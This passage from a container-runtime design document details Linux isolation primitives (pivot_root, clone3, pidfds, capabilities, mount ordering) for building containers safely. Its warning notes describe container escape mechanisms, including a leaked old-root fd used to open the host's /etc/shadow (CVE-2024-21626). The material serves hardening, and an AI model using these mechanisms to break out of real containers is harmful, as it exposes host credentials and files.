| `new_root`'s mount must not be `MNT_LOCKED` | `new_mnt->mnt.mnt_flags & MNT_LOCKED` | `EINVAL` |
| `new_root`'s dentry must not have been unlinked | `d_unlinked(new.dentry)` | **`ENOENT`** |
| both mounts must be in the **caller's** mount namespace | `!check_mnt(root_mnt) \|\| !check_mnt(new_mnt)` | `EINVAL` |

> **Trap.** The shared-propagation rule is widely restated as "`/` must not be shared". The kernel
> tests three *other* mounts: the mount holding `put_old`, the **parent of `new_root`**, and the
> **parent of the current root**. With the `pivot_root(".", ".")` idiom the first two are the rootfs
> self-bind and the mount holding the rootfs path — both neutralised by making the rootfs's parent
> mount private *before* binding. `root_parent` on a normally booted system is the hidden initramfs
> `rootfs` mount, which is private. So `pivot_root` does not actually require the recursive-slave
> change on `/`; that change is required for *other* reasons (§4).

> **Trap.** The last two rows are attacker-reachable from a malicious rootfs and are missing from
> most documentation. Do not promise `EINVAL` in the error mapping for "new_root is the current
> root" either — it is `EBUSY`.

**Fact.** `pivot_root` "does not change the caller's current working directory (unless it is on the
old root directory), and thus it should be followed by a `chdir("/")` call." Measured on kernel
6.11.0-29, after a successful pivot the caller's cwd was `/oldroot/root` — still on the old root,
now reachable under `put_old`. Forgetting the `chdir` leaves the process with a working directory
outside its own root, which is both a functional bug and an escape vector.

**Fact — what the old root becomes.** Measured, kernel 6.11.0-29: after `pivot_root` into a scratch
rootfs, `/oldroot` contained the entire host filesystem. After `umount2("/oldroot", MNT_DETACH)`,
`listdir("/oldroot")` was empty and the running Python interpreter **died** on its next path lookup
(`/proc/self/mountinfo`), cascading into `ModuleNotFoundError: No module named 're'` from its own
traceback handler. The binary and already-mapped pages kept running from open fds; every *new path
lookup* failed, because the interpreter and its stdlib lived in the old root. Two rules follow: every
mount the container needs must exist inside the new rootfs **before** the detach, and the process
must `execve` a binary from within the new rootfs. Anything still needed from outside must be held
as an **fd**, never as a path.

> **Trap.** Those held fds are themselves the escape. After `MNT_DETACH` the superblocks survive as
> long as a reference exists, and path resolution from a dirfd does not consult the mount tree for
> its starting point — so `openat(oldroot_fd, "etc/shadow", …)` still works. This is the mechanism of
> **CVE-2024-21626**. Marking them close-on-exec is sufficient *only if nothing between the pivot and
> the `execve` leaks them*, which is an invariant nobody will remember in a year. **Close them
> explicitly**, at the end of the pivot sequence.

**Fact.** `pivot_root` cannot be used on an initramfs (`rootfs`, a `ramfs`, cannot be moved), which
is why early boot uses `switch_root`-style `MS_MOVE`+`chroot`. That is the only legitimate reason to
implement the fallback, and the fallback's mandatory first step — finding every full `proc` and
`sysfs` mount outside the target rootfs and detaching or covering it — is the part that is easy to
omit and dangerous to get half right.

### 3.8 pidfds

**Fact.** A pidfd is a stable reference to a process, immune to PID reuse.

| Call | Since | Use |
|---|---|---|
| `clone3(CLONE_PIDFD)` | 5.2 | obtain the pidfd race-free at creation |
| `pidfd_open(pid_t pid, unsigned int flags)` | 5.3 | obtain one for an existing process |
| `pidfd_send_signal(int pidfd, int sig, siginfo_t *info, unsigned int flags)` | 5.1 | signal without a PID-reuse race |
| `waitid(P_PIDFD, pidfd, &info, options)` | 5.4 | reap by pidfd |
| `pidfd_getfd(int pidfd, int targetfd, unsigned int flags)` | 5.6 | steal an fd from the target |
| `poll`/`epoll` on the pidfd | 5.3 | becomes **readable** when the process exits |

**Fact — a successful return means "accepted for delivery", never "delivered".** Measured, kernel
6.11.0-29: `pidfd_send_signal(pidfd, SIGTERM)` on a container PID 1 with no handler returned **0**
and the process survived; the subsequent `SIGKILL` returned 0 and did kill it
(`waitid` → signalled, signo 9). The §2.1.2 PID-1 disposition rules are the reason, and no API
reports the discard.

**Recommendation.** Take the pidfd from `clone3(CLONE_PIDFD)` and use it as the container handle for
every subsequent signal and for exit notification. It removes an entire class of "signalled the
wrong process after PID reuse" bug that is essentially impossible to write a test for.

### 3.9 `prctl(2)` operations we need

| Operation | Value | Since | What it does |
|---|---|---|---|
| `PR_SET_NO_NEW_PRIVS` | 38 | 3.5 | Set the `no_new_privs` bit: `execve` never grants privilege (setuid bits, file capabilities and LSM transitions are ignored). Irreversible; inherited across `fork` and `execve` |
| `PR_CAPBSET_DROP` | 24 | 2.6.25 | Drop one capability from the **bounding** set. Needs **effective** `CAP_SETPCAP`. Irreversible |
| `PR_CAPBSET_READ` | 23 | 2.6.25 | Test one bounding bit |
| `PR_SET_KEEPCAPS` | 8 | 2.2.18 | Preserve the **permitted** set across a uid-0→non-zero transition. Does **not** preserve effective. Cleared by `execve` |
| `PR_CAP_AMBIENT` (`_RAISE`/`_LOWER`/`_IS_SET`/`_CLEAR_ALL`) | 47 | 4.3 | Manage the ambient set. Invariant: "no capability can ever be ambient if it is not both permitted and inheritable" |
| `PR_SET_CHILD_SUBREAPER` | 36 | 3.4 | Become the reaper for orphaned descendants — **within one PID namespace only** (§2.1.2) |
| `PR_SET_PDEATHSIG` | 1 | 2.1.57 | Deliver a signal when the *parent thread* dies. Cleared on `fork` and when credentials change at `execve` |
| `PR_SET_DUMPABLE` | 4 | 2.3.20 | Controls `/proc/<pid>` ownership; a non-dumpable target's `uid_map` cannot be written by an unprivileged writer (`EACCES`) |
| `PR_SET_SECUREBITS` | 28 | 2.6.26 | `SECBIT_NOROOT` disables the uid-0 special case of the `execve` capability transformation; `SECBIT_KEEP_CAPS` is the securebit form of `PR_SET_KEEPCAPS` and is always cleared on `execve` |

### 3.10 `close_range(2)`

```c
int close_range(unsigned int first, unsigned int last, unsigned int flags);   /* 436, Linux 5.9 */
```

**Fact.** Closes (or marks cloexec) a whole fd range in one call. `CLOSE_RANGE_UNSHARE` (Linux 5.9)
unshares the fd table first; `CLOSE_RANGE_CLOEXEC` (**Linux 5.11**) marks the range close-on-exec
rather than closing it.

> **Trap — the flag's version is not the syscall's version.** `close_range` is 5.9;
> `CLOSE_RANGE_CLOEXEC` is **5.11**. Probing the syscall does not prove the flag. On a 5.9/5.10
> kernel the call exists and the flag returns `EINVAL`. This class of error — testing a syscall and
> assuming a flag — already produced one wrong version claim in this research, which is why §3.12
> enumerates every instance.

**Fact.** Measured on kernel 6.11.0-29 and on 4.18.0-425 (RHEL 8), with `flags=8` as a control to
prove the kernel validates flags: `flags=0` → 0, `CLOSE_RANGE_UNSHARE` → 0, `CLOSE_RANGE_CLOEXEC` →
**0** on both, `flags=8` → `EINVAL` on both. The RHEL-8 backport carries the 5.11 flag as well — so
you cannot infer flag availability from `uname -r` either.

**Fact.** `close_range(2)`'s own rationale explains its position in the sequence: the
`CLOSE_RANGE_CLOEXEC` form exists so descriptors "can be marked before the `seccomp(2)` profile is
set up, and the profile can control access to `close_range()` without affecting the calling
process". Marking rather than closing is also what lets the sync-pipe fd stay usable right up to the
`execve`, and avoids a live `File` object's `Drop` later closing an unrelated fd.

### 3.11 The kernel feature floor

**Fact.** Every feature this engine's creation path can use, with the version and the cost of its
absence. This table is the input to the floor decision; it is not itself the decision.

| Feature | Since | What we lose without it |
|---|---|---|
| `CLONE_NEWNS` | 2.4.19 | Everything — no private mount table |
| `CLONE_NEWUTS`, `CLONE_NEWIPC` | 2.6.19 | Hostname renames the host; SysV IPC crosstalk |
| `CLONE_NEWPID`, `CLONE_NEWNET` | 2.6.24 | Process and network isolation |
| `pivot_root` | 2.3.41 | Only `chroot`, which is escapable |
| `CLONE_NEWUSER` usable unprivileged | 3.8 | The entire rootless track |
| `PR_SET_NO_NEW_PRIVS` | 3.5 | Seccomp without `CAP_SYS_ADMIN`; setuid neutralisation |
| `PR_CAP_AMBIENT` | 4.3 | Giving a non-root entrypoint a capability without file caps |
| `CLONE_NEWCGROUP` | 4.6 | Correct `/sys/fs/cgroup`; `nsdelegate` containment |
| cgroup v2 `cgroup.kill` | 5.14 | Atomic teardown of a whole container in one write |
| `pidfd_send_signal` | 5.1 | PID-reuse-safe signalling |
| `CLONE_PIDFD`; `fsopen`/`fsconfig`/`fsmount`/`move_mount`/`open_tree` | 5.2 | Race-free pidfd at birth; fd-based mount construction |
| `clone3`, `pidfd_open` | 5.3 | 64-bit clone flags — and therefore `CLONE_INTO_CGROUP` and `CLONE_NEWTIME` |
| `waitid(P_PIDFD)` | 5.4 | Reaping by pidfd |
| `CLONE_NEWTIME`; `openat2` | 5.6 | Monotonic-clock virtualisation; `RESOLVE_*` safe path resolution |
| `CLONE_INTO_CGROUP` | 5.7 | Atomic cgroup placement — the child is unconstrained until the `cgroup.procs` write lands |
| `setns` with a pidfd + bitmask; procfs `subset=pid` | 5.8 | One-call namespace join for `exec`; one-option `/proc` hardening |
| `close_range` | 5.9 | Bulk fd hygiene before `execve` |
| **`CLOSE_RANGE_CLOEXEC`** | **5.11** | Must *close* instead of marking — breaks any still-live `File` and the sync pipe |
| overlayfs mountable in a user namespace | 5.11 | Native overlay for rootless; `fuse-overlayfs` instead |
| `mount_setattr`, `MOUNT_ATTR_IDMAP` | 5.12 | Correct recursive read-only binds; idmapped volumes |
| `MOVE_MOUNT_BENEATH`; overlayfs on `fs_context` | 6.5 | Atomic mount replacement; native overlay option parsing (below it, the legacy shim re-imposes the `PAGE_SIZE` option ceiling) |
| overlay `lowerdir+` | **6.7** (docs say 6.8) | Many-layer images need the relative-path/`chdir` workaround |
| `statmount`/`listmount` | 6.8 | Mount introspection without parsing `/proc/self/mountinfo` |

**Recommendation.** Hard floor **5.10**, documented and tested floor **5.15**. Reasoning: `clone3`
(5.3), `CLONE_PIDFD` (5.2), `pidfd_send_signal` (5.1) and `CLONE_INTO_CGROUP` (5.7) are all below
5.10, so a single-`clone3` architecture is available there; and at 5.15 `CLOSE_RANGE_CLOEXEC` (5.11)
and `mount_setattr` (5.12) are present too, which leaves **nothing in the creation path needing a
runtime probe**. Tradeoff: this explicitly excludes RHEL 8 / kernel 4.18, where `clone3` is `ENOSYS`
— supporting it is not "add a fallback", it is maintaining a second process-creation architecture.
Keep the `ENOSYS`/`EINVAL` probe policy for the features *above* the floor: `lowerdir+` (6.7),
`MOVE_MOUNT_BENEATH` (6.5), `statmount` (6.8).

**Fact — do not infer availability from `uname -r`.** Measured syscall-presence probe (`ENOSYS`
versus any other errno) on kernel 4.18.0-425 (RHEL 8): `open_tree`, `move_mount`, `fsopen`,
`fsconfig`, `fsmount`, `fspick`, `close_range` (and its 5.11 flag), `openat2` all **present** via
backport; `clone3`, `mount_setattr`, `statmount`, `listmount` `ENOSYS`. Enterprise kernels backport
selectively, so a parsed version number is the wrong gate. Probe by calling.

### 3.12 Where a flag's version differs from its syscall's version

**Fact.** This is a distinct error class from "is the syscall present", and it has already produced
one wrong claim in this research. Every instance in our path:

| Syscall | Since | Flag / feature | Since |
|---|---|---|---|
| `close_range` | 5.9 | `CLOSE_RANGE_CLOEXEC` | **5.11** |
| `clone3` | 5.3 | `set_tid` / `set_tid_size` | 5.5 |
| `clone3` | 5.3 | `CLONE_INTO_CGROUP` (and the 88-byte size it demands) | **5.7** |
| `setns` | 3.0 | pidfd form with a `CLONE_NEW*` bitmask | **5.8** |
| `move_mount` | 5.2 | `MOVE_MOUNT_BENEATH` | **6.5** |
| `open_tree` | 5.2 | `OPEN_TREE_NAMESPACE` | **never — it does not exist** |
| `mount(2)` / `fsconfig` | — | overlay `lowerdir+` | **6.7**, documented as 6.8 |
| `mount -t proc` | — | `subset=pid` | 5.8 |
| legacy `clone(2)` | — | `CLONE_NEWTIME` | **unreachable at any version** — `0x80` collides with `CSIGNAL` |

**Recommendation.** Probe the *flag*, not the syscall, for every row above, and make the probe a
no-op call with an empty range or a bogus-but-harmless argument so it has no side effects
(`close_range(1000000, 1000001, flag)` is the pattern used to produce the measurements in §3.10).

### What this decides

| Decision | Urgency |
|---|---|
| The kernel floor: hard 5.10 / documented 5.15, versus keeping a legacy-`clone` architecture for RHEL 8 | **Urgent** — it determines whether there is one process-creation path or two |
| Whether the MVP's mount layer is `mount(2)` or the fd-based API (recommended: `mount(2)` now, fd-resolved targets from day one) | Deferrable — but the *descriptor* shape must be decided now |
| Whether to adopt `openat2(RESOLVE_BENEATH)` for mount-target resolution in the MVP | **Urgent-ish** — it is one call and it closes most of the symlink-TOCTOU gap cheaply |
| Many-layer overlay strategy: require 6.7 and use `lowerdir+`, or implement the relative-path `chdir` workaround for the 5.15 floor | **Urgent** — at the recommended floor the workaround is not optional |

---

## 4. The container creation sequence

What must happen, in order, for `mydocker run alpine /bin/sh` to end with the user's shell running
inside a container. Four actors appear in the tables:

- **CLI** — the command-line front end, before any container exists.
- **SUP** — the supervisor: the engine process that performs the `clone3` and outlives the
  container. It stays in the host namespaces throughout.
- **INIT** — the cloned child, between `clone3` returning 0 and `execve`. It is PID 1 of the new PID
  namespace. Everything it does is constrained by §3.1's post-clone rules: no allocation, no
  buffered I/O, no panic, no glibc `set*id`.
- **KRN** — work the kernel performs as a side effect of a call, listed where the ordering depends
  on it.

### 4.1 The step index

**Privilege** names the capability and the namespace it must be held in. For the root-first MVP
every "CAP_X in the initial userns" row is satisfied by being real root; the column exists because
it is exactly the list that has to be re-examined when the rootless track lands.

| # | Step | Who | Primitive | Privilege | MVP | Important failure cases |
|---|---|---|---|---|---|---|
| 1 | Parse the command line into a run config | CLI | — | none | yes | conflicting `-d`/`-it`; unknown flag |
| 2 | Resolve the image reference; ensure all layers are present in the store | CLI | registry client | none | yes | image missing; digest mismatch; partial layer from an interrupted pull |
| 3 | **Materialise the rootfs** (overlay mount, or a plain directory) | SUP | `mount(2)` with `lowerdir=`, or `fsopen`+N×`fsconfig("lowerdir+")`+`fsmount`+`move_mount` | `CAP_SYS_ADMIN` in the initial userns | yes | on `mount(2)`: option string >4095 B is **silently truncated**, surfacing as `ENOENT` on a path that exists; on `fsconfig`: `EINVAL` for a lower path >255 B or `lowerdir+` below 6.7; `EBUSY` on a reused `upperdir` |
| 4 | Create the runtime state directory and take an exclusive lock on it | SUP | `mkdir`, `open(O_CLOEXEC)`, `flock` | none | yes | stale state from a crashed run; two `run`s racing on one container id |
| 5 | **Create the container cgroup**; enable controllers in the *parent's* `cgroup.subtree_control`; open the leaf `O_DIRECTORY` | SUP | `mkdir`, `write`, `open(2)` | write access to the delegated subtree | yes | controller absent from `subtree_control` → the limit file does not exist → `ENOENT`; no-internal-process rule → `EBUSY`; systemd reclaiming an undelegated cgroup |
| 6 | Write the resource limits | SUP | `write` to `memory.max`, `pids.max`, `cpu.max` | as above | partial | `EINVAL` on a malformed value; a limit written to a cgroup whose controller is not enabled |
| 7 | Create the sync socketpair | SUP | `socketpair(AF_UNIX, SOCK_SEQPACKET, 0)` | none | yes | fd exhaustion |
| 8 | Allocate the **host** pty pair (only for `-it`) | SUP | `posix_openpt`/`open("/dev/ptmx")`, `grantpt`, `unlockpt` | none | yes (`-it`) | host `/dev/ptmx` missing (a container-in-container case) |
| 9 | **Assert `Threads == 1`** | SUP | read `/proc/self/status` | none | **yes** | any dependency started a thread ⇒ later `EINVAL` on `CLONE_NEWUSER` and inherited-lock hangs (§3.1) |
| 10 | **Pre-build everything the child will need**: argv/envp/path C strings, every mount descriptor, the compiled seccomp program, the LSM label string | SUP | — | none | **yes** | no allocation is safe after the clone; a profile still on disk is unreachable after the pivot |
| 11 | **Flush all stdio** | SUP | `fflush(NULL)` / `Write::flush` | none | **yes** | unflushed buffers are inherited and re-emitted by the child at its exit — duplicated output, not a crash |
| 12 | **`clone3`** with `NEWNS\|NEWPID\|NEWNET\|NEWUTS\|NEWIPC` + `CLONE_PIDFD` + `CLONE_INTO_CGROUP` | SUP | `clone3(2)` | `CAP_SYS_ADMIN` in the initial userns | **yes** | `EINVAL` from an exit signal left in `flags`, or `size < 88` with `CLONE_INTO_CGROUP`; `EBADF`/`EOPNOTSUPP` on the cgroup fd; `ENOSPC` on a namespace count limit; `ENOSYS` below 5.3 |
| 12k | Child is created inside all five namespaces **and already attached to the target cgroup** | KRN | `cgroup_can_fork()` | — | — | — |
| 13 | *(userns / legacy-clone paths only)* wait on the sync socket for the parent's go-ahead | INIT | `read(2)` | none | no | parent died ⇒ short read ⇒ child must `_exit`, not hang |
| 14 | **`unshare(CLONE_NEWCGROUP)`** — in the child, *after* cgroup placement | INIT | `unshare(2)` | `CAP_SYS_ADMIN` in the owning userns | yes | putting this flag in step 12 instead roots the namespace at the *supervisor's* cgroup (§4.2) |
| 15 | *(userns only)* write `setgroups=deny`, then `uid_map`, then `gid_map` for the child | SUP | `write` to `/proc/<pid>/*` | `CAP_SETUID`/`CAP_SETGID` in the parent userns for multi-extent maps | no | order inverted ⇒ `EPERM`; non-dumpable target ⇒ `EACCES`; fd opened *before* the child unshared ⇒ `EPERM` (§4.7) |
| 16 | Plumb the network namespace: create the veth pair, move one end in, address it, bring up `lo` | SUP | rtnetlink | `CAP_NET_ADMIN` in both netns | partial — `lo` up only | must complete before step 48 releases the child |
| 17 | **`MS_REC\|MS_SLAVE` on `/`** | INIT | `mount(NULL,"/",NULL,MS_REC\|MS_SLAVE,NULL)` | `CAP_SYS_ADMIN` in the owning userns | yes | omitted ⇒ volume binds are two-way channels and teardown umounts propagate to the host (§4.9) |
| 18 | **Non-recursive `MS_PRIVATE` on the rootfs's parent mount**, walking up on `EINVAL` | INIT | `mount(2)` | as above | yes | omitted ⇒ `pivot_root` later fails `EINVAL`, and the container's own mounts stay in the host's peer group |
| 19 | **Recursive self-bind of the rootfs** | INIT | `mount(rootfs, rootfs, NULL, MS_BIND\|MS_REC, NULL)` | as above | yes | omitted ⇒ `pivot_root` `EINVAL` (`new_root` is not a mount point) |
| 20 | **Mount `proc` at `<rootfs>/proc`** | INIT | `mount("proc", …, "proc", MS_NOSUID\|MS_NODEV\|MS_NOEXEC, NULL)` | `CAP_SYS_ADMIN` in the userns owning **the caller's PID ns** | yes | mounted by the supervisor instead ⇒ the container sees host PIDs (§4.3) |
| 21 | Mount `tmpfs` at `<rootfs>/dev`, `nosuid,mode=755,size=65536k` | INIT | `mount(2)` | `CAP_SYS_ADMIN` in the owning userns | yes | a **fresh** tmpfs here is a security requirement, not a convention (§4.10 Trap 9) |
| 22 | Create the core device nodes: `null`(1,3) `zero`(1,5) `full`(1,7) `random`(1,8) `urandom`(1,9) `tty`(5,0) | INIT | `mknod(2)` as root, or a read-only bind from an fd held across the pivot | `CAP_MKNOD` **in the initial userns** | yes | rootless ⇒ `EPERM` even with a full 41-cap `CapEff`; binding by rootfs *path* is CVE-2025-31133's vector |
| 23 | Mount `devpts` at `<rootfs>/dev/pts`, `nosuid,noexec,gid=5,mode=620,ptmxmode=666` | INIT | `mount(2)` | `CAP_SYS_ADMIN` in the owning userns | yes | missing ⇒ `openpty()` → "out of pty devices" → no `-it` at all |
| 24 | Mount `tmpfs` at `<rootfs>/dev/shm`, `nosuid,nodev,noexec,mode=1777,size=65536k` | INIT | `mount(2)` | as above | yes | missing ⇒ `shm_open`, `sem_open`, Python `multiprocessing`, PostgreSQL, Chromium all fail `ENOENT` |
| 25 | Mount `mqueue` at `<rootfs>/dev/mqueue` | INIT | `mount(2)` | `CAP_SYS_ADMIN` in the userns owning **the IPC ns** | later | nothing in a normal image needs it |
| 26 | Mount `sysfs` read-only at `<rootfs>/sys` | INIT | `mount(2)` | `CAP_SYS_ADMIN` in the userns owning **the net ns** | yes | rootless **sharing the host netns** cannot mount it at all — must bind host `/sys` read-only instead |
| 27 | Mount `cgroup2` read-only at `<rootfs>/sys/fs/cgroup` | INIT | `mount("cgroup", …, "cgroup2", MS_RDONLY\|MS_NOSUID\|MS_NODEV\|MS_NOEXEC, NULL)` | `CAP_SYS_ADMIN` in the userns owning the cgroup ns | yes | must follow step 14, or it exposes the supervisor's whole subtree including sibling containers |
| 28 | Create `/dev/fd`→`/proc/self/fd`, `/dev/std{in,out,err}`, `/dev/ptmx`→`pts/ptmx` | INIT | `symlink(2)` | none | yes | none at creation — `symlink(2)` does not resolve its target; only dereferencing needs `/proc` |
| 29 | User bind mounts and volumes (two-pass, or `mount_setattr(AT_RECURSIVE)`) | INIT | `mount(2)`×2, or `mount_setattr(2)` | `CAP_SYS_ADMIN` in the owning userns | later | the first pass ignores flags; the two-pass form leaves nested submounts writable |
| 30 | `readonlyPaths` and `maskedPaths` | INIT | `mount(2)` bind, tmpfs-over-directory, `/dev/null`-over-file | as above | later | needs steps 20 and 22 done; masking is per-superblock so it is only a boundary once `CAP_SYS_ADMIN` is gone |
| 31 | **`pivot_root`** — the seven-call sequence of §4.4, ending with `chdir("/")` and the explicit close of both held fds | INIT | `open(O_PATH)`, `fchdir`, `pivot_root(2)`, `mount(2)`, `umount2(MNT_DETACH)`, `chdir`, `close` | `CAP_SYS_ADMIN` in the userns owning the mount ns | **yes** | ten documented preconditions (§3.7); omitting `chdir("/")` leaves cwd outside the root; leaving the fds open is a complete escape |
| 32 | Re-open `/dev/null` for any inherited fd that still points at the old root's one | INIT | `open(2)` | none | later | stale fds into a detached tree keep that tree's superblock alive |
| 33 | `sethostname` (and `setdomainname`) | INIT | `sethostname(2)` | `CAP_SYS_ADMIN` in the userns owning the UTS ns | yes | without `CLONE_NEWUTS` in step 12 this renames the **host** |
| 34 | `setsid()`; open the pty **slave** from the container's own devpts; `TIOCSCTTY`; `dup2` onto 0/1/2 | INIT | `setsid(2)`, `open`, `ioctl(2)` | none | yes (`-it`) | `TIOCSCTTY` → `EPERM` without session leadership; needs step 23 |
| 35 | Write the LSM label | INIT | `write` to `/proc/self/attr/exec` | varies by LSM | later | takes effect at `execve`; must be written while still privileged |
| 36 | **seccomp — branch A**, only when `no_new_privs` is *not* being set | INIT | `seccomp(SECCOMP_SET_MODE_FILTER)` | `CAP_SYS_ADMIN` in the thread's userns | later | run after step 38 without NNP ⇒ `EACCES` |
| 37 | `capset`: clear the **inheritable** set | INIT | `capset(2)` | none | later | an inheritable bit left set survives the bounding drop and re-enters permitted at `execve` |
| 38 | **Drop the capability bounding set** — `PR_CAPBSET_DROP` for every unwanted capability | INIT | `prctl(2)` | **effective** `CAP_SETPCAP` | later | run *after* step 40 and it fails `EPERM` for every non-root container while silently succeeding for `USER root` (§4.5) |
| 39 | `PR_SET_KEEPCAPS, 1` | INIT | `prctl(2)` | none | later | preserves **permitted** only |
| 40 | `setgroups`, `setresgid`, `setresuid` — via **raw** syscalls | INIT | `syscall(SYS_setgroups/SYS_setresgid/SYS_setresuid)` | `CAP_SETGID`/`CAP_SETUID` | yes | glibc's wrappers broadcast `SIGSETXID` to a stale thread list and hang in an uninterruptible futex (§4.5) |
| 40k | The effective set is wiped by the euid 0→non-zero transition | KRN | — | — | — | — |
| 41 | `PR_SET_KEEPCAPS, 0` | INIT | `prctl(2)` | none | later | — |
| 42 | `capset`: permitted = effective = wanted; inheritable = the ambient candidates | INIT | `capset(2)` | none | later | this is the step that undoes 40k; new permitted must be a subset of existing permitted |
| 43 | `PR_CAP_AMBIENT_RAISE` for each ambient capability | INIT | `prctl(2)` | none | later | "no capability can ever be ambient if it is not both permitted and inheritable" — hence 42 first |
| 44 | `chdir(workdir)` | INIT | `chdir(2)` | none | yes | `EACCES` is now the honest answer, because the identity is the running one |
| 45 | `PR_SET_NO_NEW_PRIVS, 1` | INIT | `prctl(2)` | none | later | irreversible; must precede step 49 |
| 46 | **`close_range(3, ~0u, CLOSE_RANGE_CLOEXEC)`** | INIT | `close_range(2)` | none | yes | the flag is 5.11, the syscall 5.9; a leaked host fd into the container is a documented escape class (CVE-2024-21626) |
| 47 | Signal readiness on the sync socket; wait for `start` | INIT | `write`/`read` | none | yes | the fd is cloexec-marked, not closed, so it is still usable — this is why step 46 marks rather than closes |
| 48 | Release the child once the network and any post-create hooks are done | SUP | `write` to the sync socket | none | yes | releasing early means the workload runs before it has a network |
| 49 | **seccomp — branch B**, only when `no_new_privs` *is* set | INIT | `seccomp(2)` | none (NNP substitutes for `CAP_SYS_ADMIN`) | later | every syscall after this point must be permitted by the profile — including `execve` |
| 50 | **`execve`** | INIT | `execve(2)` | none | **yes** | `ENOENT` for a missing binary *or a missing dynamic loader inside the image*; `EACCES`; `ENOEXEC` |
| 51 | Supervise: poll the pidfd, `waitid(P_PIDFD)`, report the exit status, remove the cgroup and the netns plumbing | SUP | `epoll`, `waitid(2)`, `rmdir` | — | yes | a successful `kill` is not a delivery (§4.8); `rmdir` on a non-empty cgroup is `EBUSY` |

### 4.2 The clone flag word, and why the cgroup namespace is not in it

```c
struct clone_args a;  memset(&a, 0, sizeof a);
a.flags       = CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWNET
              | CLONE_NEWUTS | CLONE_NEWIPC
              | CLONE_PIDFD | CLONE_INTO_CGROUP;   /* NOT CLONE_NEWCGROUP */
a.exit_signal = SIGCHLD;                            /* NOT in flags */
a.pidfd       = (__u64)(uintptr_t)&pidfd;
a.cgroup      = (__u64)cgroup_dirfd;
pid = syscall(SYS_clone3, &a, sizeof a);            /* sizeof, always */
```

**Fact.** `CLONE_INTO_CGROUP` and `CLONE_NEWCGROUP` in the same `clone3` compose without error and
produce the wrong result. `v6.11/kernel/cgroup/namespace.c#L75` (`copy_cgroup_ns`):

```c
	spin_lock_irq(&css_set_lock);
	cset = task_css_set(current);      /* the CALLER's cgroup — the supervisor's */
	get_css_set(cset);
	spin_unlock_irq(&css_set_lock);
	...
	new_ns->root_cset = cset;
```

The new cgroup namespace is rooted at **`current`'s** css_set, evaluated inside `copy_namespaces()`,
entirely independently of `cgroup_can_fork()`/`CLONE_INTO_CGROUP`, which attach the *child*. For an
ordinary `clone` the two cgroups are the same and nobody notices. Add `CLONE_INTO_CGROUP` and they
diverge: the container's cgroup namespace root becomes the **supervisor's** cgroup, one or more
levels above the container's.

> **Trap 1.** Observable consequences, all bad and none of them an error: `/proc/self/cgroup` inside
> the container reads `0::/<container-leaf>` instead of `0::/`; `mount -t cgroup2` inside exposes
> the supervisor's whole subtree, **including sibling containers' cgroups**; and under `nsdelegate`
> the containment boundary is drawn around the supervisor's cgroup rather than the container's.
> `cgroup_namespaces(7)`'s wording ("its current cgroups directories become the cgroup root
> directories") reads as if the child's cgroup is used, which is exactly what makes this trap
> plausible.

**Recommendation.** Keep `CLONE_INTO_CGROUP` in the clone — it is the only way to close the window
in which the child exists but is not yet in its cgroup, during which it can fork, spike CPU, or
allocate past the intended limit. **Drop `CLONE_NEWCGROUP` from the clone flags** and have the child
`unshare(CLONE_NEWCGROUP)` as step 14, before anything mounts `/sys/fs/cgroup`. The child is in the
target cgroup from its first instruction and holds `CAP_SYS_ADMIN`, so the unshare is one syscall
that cannot fail for privilege reasons.

**Convention.** runc reaches the same ordering by a different route: it calls `manager.Apply(pid)`
before writing the bootstrap data (`runc@v1.5.1/libcontainer/process_linux.go#L822-L825`, comment:
"Do this before syncing with child so that no children can escape the cgroup"), and `nsexec.c` then
unshares the remaining namespaces — cgroup included — from a process already in the target cgroup.

### 4.3 Why `/proc` must be mounted by the child, after the PID namespace, and before the pivot

**Fact.** A procfs instance is bound to the PID namespace of the process that mounted it, and there
is **no way to request a different one**. `v6.11/fs/proc/root.c#L252` (`proc_init_fs_context`):

```c
	ctx->pid_ns = get_pid_ns(task_active_pid_ns(current));
	fc->user_ns = get_user_ns(ctx->pid_ns->user_ns);
```

Three consequences:

1. **The supervisor cannot pre-mount `/proc` into the rootfs.** It is in the host PID namespace, so
   the instance it creates shows host PIDs forever, no matter who later reads it. This is §2.1.2's
   "164 processes" measurement wearing a different hat, and it is a silent failure: everything works,
   the container just sees the host.
2. **The permission check is `ns_capable(pid_ns->user_ns, CAP_SYS_ADMIN)`**, via `mount_capable()`
   (`v6.11/fs/super.c#L690`: `if (!(fc->fs_type->fs_flags & FS_USERNS_MOUNT)) return
   capable(CAP_SYS_ADMIN); else return ns_capable(fc->user_ns, CAP_SYS_ADMIN);`). So a *new* PID
   namespace is not strictly required to mount procfs — what is required is that the PID namespace
   you are in is owned by a user namespace in which you hold `CAP_SYS_ADMIN`. For a root-first MVP
   in the initial user namespace that is satisfied unconditionally. The familiar rule "mounting
   procfs in a user namespace requires a new PID namespace" is true only *inside* a user namespace,
   and only because the initial PID namespace is owned by the initial user namespace.
3. If an `fsopen("proc")` handle is to be carried across the pivot (so that `/proc/self/fd/…` tricks
   keep working while the new `/proc` is being set up), the `fsopen` must itself have been issued
   from inside the target PID namespace.

**Fact.** The same shape governs three other filesystems, and `user_namespaces(7)` is wrong about
two of them — it lists `/sys` and `mqueue` under the *mount*-namespace clause:

| filesystem | `fc->user_ns` comes from | source |
|---|---|---|
| `proc` | owner of the caller's **PID** namespace | `v6.11/fs/proc/root.c#L252` |
| `sysfs` | owner of the caller's **net** namespace, plus `kobj_ns_current_may_mount(KOBJ_NS_TYPE_NET)` → `EPERM` | `v6.11/fs/sysfs/mount.c` |
| `mqueue` | owner of the caller's **IPC** namespace | `v6.11/ipc/mqueue.c` |
| `devpts`, `tmpfs` | owner of the mount namespace (plain `FS_USERNS_MOUNT`) | `v6.11/fs/devpts/inode.c` |

Measured on kernel 4.18.0-425, unprivileged: `unshare -U -m --map-root-user` → `mount -t proc`
permission denied, with `CapEff: 000001ffffffffff`; adding `-p -f` → succeeds, 4 visible pids.
`unshare -U -m -n --map-root-user` → sysfs mounts; without `-n` → permission denied.
`unshare -U -m -i --map-root-user` → mqueue mounts; without `-i` → permission denied.

**Fact.** `/proc` is mounted at `<rootfs>/proc` — i.e. **before** the pivot, into the future rootfs
— for the reason in §3.7: after `umount2(put_old, MNT_DETACH)` nothing outside the new root has a
pathname, so nothing can be mounted by path any more. The pivot is the point of no return for every
path-based operation.

> **Trap 2.** A PID namespace without a fresh `/proc` instance is worth nothing. Measured, kernel
> 6.11.0-29: `unshare -mpf --propagation private sh -c 'ls /proc | grep -cE "^[0-9]+$"'` → **164**.
> Both halves are required and neither is optional.

### 4.4 The `pivot_root` sequence, call by call

```c
